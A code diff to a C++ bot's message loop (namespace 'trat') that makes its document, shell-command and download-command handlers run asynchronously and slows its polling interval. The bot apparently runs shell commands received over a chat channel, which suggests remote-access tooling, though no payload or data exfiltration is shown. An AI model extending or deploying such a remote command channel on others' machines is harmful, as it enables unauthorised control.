@@ -4,6 +4,11 @@
 #include <thread>
 #include <future> // For async handling
 
+/*
+ * Ugliness in the code is necessary in this case
+ * Each handling Method should run asynchronously, this way the code is more efficient and faster.
+ *
+ */
 namespace trat
 {
   void Bot::listen()
@@ -33,16 +38,26 @@ namespace trat
 
           if  ( (message_document) && !(message_text) )
           {
-            auto future = std::async(std::launch::async, [this, message_document]()
+            auto handling_documents_future = std::async(std::launch::async, [this, message_document]()
             {
               this->handleDocuments(message_document);
             });
-            future.get();
+            handling_documents_future.get();
           
           }else if (this->checkIfCommand(message_text)) 
           {
-            this->handleShellCommand(message_text);
-            this->handleDownloadCommand(message_text);
+            auto handling_shell_command_future = std::async(std::launch::async, [this, message_text]()
+            {
+              this->handleShellCommand(message_text);
+            });
+            handling_shell_command_future.get();
+            
+            auto handling_download_command_future = std::async(std::launch::async, [this, message_text]()
+            {
+                this->handleDownloadCommand(message_text);
+            });
+            handling_download_command_future.get();
+          
           }else 
           {
             // Handle non-command message asynchronously, and capture the returned future
@@ -58,7 +73,7 @@ namespace trat
           offset = update.update_id + 1;
 
           // To prevent busy-waiting
-          std::this_thread::sleep_for(std::chrono::milliseconds(1));
+          std::this_thread::sleep_for(std::chrono::seconds(1));
         }
       }
 
